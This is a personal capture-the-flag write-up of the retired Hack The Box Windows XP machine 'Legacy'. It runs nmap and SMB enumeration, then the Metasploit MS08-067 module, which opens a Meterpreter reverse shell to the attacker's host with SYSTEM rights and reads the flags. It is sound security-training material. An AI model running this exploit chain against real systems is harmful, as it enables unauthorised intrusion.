Type: #windows 
Level: #easy
Link: <https://app.hackthebox.eu/machines/Legacy>
Tags : #TCM
Tools: [[NMAP]] [[SMBCLIENT]] [[METASPLOIT]]	

## Pentesting of retired HTB VM Legacy
### Following walkthrougt of TCM on udemy

Info on the VM : Windows with IP 10.10.10.4

First let's do a classic nmap scan  
`sudo nmap -A -T4 -p- 10.10.10.4`

Result popping up  
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-03 09:05 EDT
Nmap scan report for 10.10.10.4
Host is up (0.041s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server

Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP2 (92%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows 2000 SP4 (91%), Microsoft Windows XP SP2 or Windows Server 2003 (91%), Microsoft Windows XP SP2 or SP3 (91%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP Professional SP3 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h29m02s, deviation: 2h07m16s, median: 4d22h59m02s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:a5:9c (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-04-08T18:08:12+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   45.81 ms 10.10.14.1
2   45.09 ms 10.10.10.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 294.94 seconds
```

We got the ports :

```
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
```

**139** and **445** are [[SMB-SAMBA]] ports which is a common attack vector

We also got the OS version : [[Windows XP]] 

Try to connect to SMB :

```
smbclient -L \\\\10.10.10.4\\                                                                                                                                                                                                                                                                                     1 ⨯
Enter WORKGROUP\kali's password: 
session setup failed: NT_STATUS_INVALID_PARAMETER
```

So we need the SMB version.  
Starting up [[METASPLOIT]] :

```
msfconsole
search smb_version
use auxiliary/scanner/smb/smb_version
options
RHOSTS = 10.10.10.4
```

Results of the scan :

```
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.10.10.4:445        - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[+] 10.10.10.4:445        -   Host is running Windows XP SP3 (language:English) (name:LEGACY) (workgroup:HTB)
[*] 10.10.10.4:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

Exploit :
```
use exploit/windows/smb/ms08_067_netapi
set rhosts 10.10.10.4
run

```

Got reverse shell :
```
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.7:8923 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Unknown
[*] 10.10.10.4:445 - We could not detect the language pack, defaulting to English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.7:8923 -> 10.10.10.4:1031) at 2021-04-03 12:20:03 -0400

meterpreter > userid
[-] Unknown command: userid.
meterpreter >
```

To know the user ([[Important windows commands]]):  `getuid`

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

user flag :

```
shell
cd c:\Documents and Settings\john\Desktop
type user.txt
```

root flag :
```
shell
cd c:\Documents and Settings\Administrator\Desktop
type root.txt
```

And voilà.

#pwned